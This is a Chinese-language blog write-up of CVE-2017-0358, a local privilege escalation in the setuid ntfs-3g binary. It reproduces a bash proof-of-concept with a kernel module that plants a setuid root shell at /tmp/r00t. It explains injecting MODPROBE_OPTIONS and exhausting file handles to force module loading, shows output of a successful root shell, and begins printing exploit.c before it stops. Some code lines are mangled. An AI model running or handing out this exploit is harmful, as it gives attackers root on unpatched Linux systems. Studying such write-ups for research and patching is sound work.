## 0x00 ntfs-3g (Debian 9) - Privilege Escalation
* * *
最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞[ntfs-3g (Debian
9) - Privilege Escalation](https://www.exploit-db.com/exploits/41240/)，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。EXP如下：
    #!/bin/bash
    echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
    echo "@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"
    echo "@  ntfs-3g local privilege escalation to root     @"
    echo "@  Credits to Google Project Zero                 @"
    echo "@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"
    echo "@  Tested: Debian 9 (Stretch)                     @"
    echo "@  Date: 2017-02-03                               @"
    echo "@  Link: https://goo.gl/A9I8Vq                    @"
    echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
    echo "[*] Gathering environment info ..."
    cwd="$(pwd)"
    un="$(uname -r)"
    dlm="$(pwd)/lib/modules"
    dkf="$(pwd)/kernel/fs"
    echo "[*] Creating kernel hijack directories ..."
    mkdir -p "${dlm}"
    mkdir -p "${dkf}"
    echo "[*] Forging symlinks ..."
    ln -sf "${cwd}" "${dlm}/${un}"
    ln -sf "${cwd}" "${dkf}/fuse"
    ln -sf cve_2017_0358.ko fuse.ko
    echo "[*] Pulling in deps ... "
    echo "[*] Building kernel module ... "
    cat  cve_2017_0358.c
    #include 
    MODULE_LICENSE("CC");
    MODULE_AUTHOR("kristian erik hermansen ");
    MODULE_DESCRIPTION("PoC for CVE-2017-0358 from Google Project Zero");
    int init_module(void) {
      printk(KERN_INFO "[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n");
      char *envp[] = { "HOME=/tmp", NULL };
      char *argv[] = { "/bin/sh", "-c", "/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t", NULL };
      call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
      char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod cve_2017_0358", NULL };
      call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);
      return 0;
    }
    void cleanup_module(void) {
      printk(KERN_INFO "[*] CVE-2017-0358 exploit unloading ...\n");
    }
    EOF
    cat  Makefile
    obj-m += cve_2017_0358.o
    all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
    clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
    EOF
    make 1>/dev/null 2>/dev/null || echo "[-] FAILED: your need make / build tools"
    cp "/lib/modules/${un}/modules.dep.bin" . || echo "[-] FAILED: linux-image location non-default?"
    MODPROBE_OPTIONS="-v -d ${cwd}" ntfs-3g /dev/null /dev/null 1>/dev/null 2>/dev/null
    /tmp/r00t -c 'whoami' | egrep -q 'root' && echo "[+] SUCCESS: You have root. Don't be evil :)"
    /tmp/r00t
疑惑的是无论如何测试，始终不成功，最后怀疑是`modprobe`函数的问题，查看[官方文档](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/sec-Setting_Module_Parameters.html)，给出如下解释：
> **The modprobe command silently succeeds with an exit status of 0 if it
> successfully loads the module, or the module is already loaded into the
> kernel.Thus, you must ensure that the module is not already loaded before
> attempting to load it with custom parameters. The modprobe command does not
> automatically reload the module, or alert you that it is already loaded.**
也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：
**“need additional modification，you have to make me an offer”** ,shit...
（注：jannh已在[www.exploit-db.com](http://www.exploit-db.com/)上发布有效版本，[ntfs-3g -Unsanitized modprobe Environment Privilege Escalation](https://www.exploit-db.com/exploits/41356/)）
## 0x01 ntfs-3g: modprobe is executed with unsanitized environment
* * *
在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh[(ntfs-3g: modprobe is executed
with unsanitized environment)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1072)。
漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用`modprobe`时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于`load_fuse_module
()`函数之中：
    static fuse_fstype load_fuse_module(void)
    {
       int i;
       struct stat st;
       pid_t pid;
       const char *cmd = "/sbin/modprobe";
       struct timespec req = { 0, 100000000 };   /* 100 msec */
       fuse_fstype fstype;
       if (!stat(cmd, &st) && !geteuid()) {
           pid = fork();
           if (!pid) {
               execl(cmd, cmd, "fuse", NULL);
               _exit(1);
           } else if (pid != -1)
               waitpid(pid, NULL, 0);
           }
       for (i = 0; i  **The MODPROBE_OPTIONS environment variable can also be used to pass
> arguments to modprobe.**
因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量 **MODPROBE_OPTIONS "-C /tmp/evil_config -d
/tmp/evil_root"** ，强制`modprobe`加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。
在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。
jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在`fopen("/proc/filesystems", "r")`时异常，导致`get_fuse_fstype()`返回
**FSTYPE_UNKNOWN** ，在主函数中触发`load_fuse_module()`函数。
    fstype = get_fuse_fstype();
    err = NTFS_VOLUME_NO_PRIVILEGE;
    if (restore_privs())
        goto err_out;
    if (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN)
        fstype = load_fuse_module();
    create_dev_fuse();
    if (drop_privs())
        goto err_out;
## 0x02 Attack
jannh给出了[EXP](https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/41356.zip)，通过测试成功在Ubuntu Server 16.10、kali
4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持）
    user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.tar
    user@ubuntu:~$ cd ntfs-3g-modprobe-unsafe/
    user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.sh
    make: Entering directory '/usr/src/linux-headers-4.8.0-32-generic'
      CC [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.o
      Building modules, stage 2.
      MODPOST 1 modules
      CC      /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o
      LD [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.ko
    make: Leaving directory '/usr/src/linux-headers-4.8.0-32-generic'
    depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directory
    depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directory
    user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploit
    looks like we won the race
    got ENFILE at 198088 total
    Failed to open /proc/filesystems: Too many open files in system
    yay, modprobe ran!
    modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open builtin file '/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'
    modprobe: ERROR: could not insert 'rootmod': Too many levels of symbolic links
    Error opening '/tmp/ntfs_sploit.u48sGO/volume': Is a directory
    Failed to mount '/tmp/ntfs_sploit.u48sGO/volume': Is a directory
    we have root privs now...
    root@ubuntu:~/ntfs-3g-modprobe-unsafe# id
    uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user)
## 0x03 Code: Exploit.c
* * *
    int main(void) {
    /* prevent shell from backgrounding ntfs-3g when stopped */
    pid_t initial_fork_child = fork();
    if (initial_fork_child == -1)
        err(1, "initial fork");
    if (initial_fork_child != 0) {
        int status;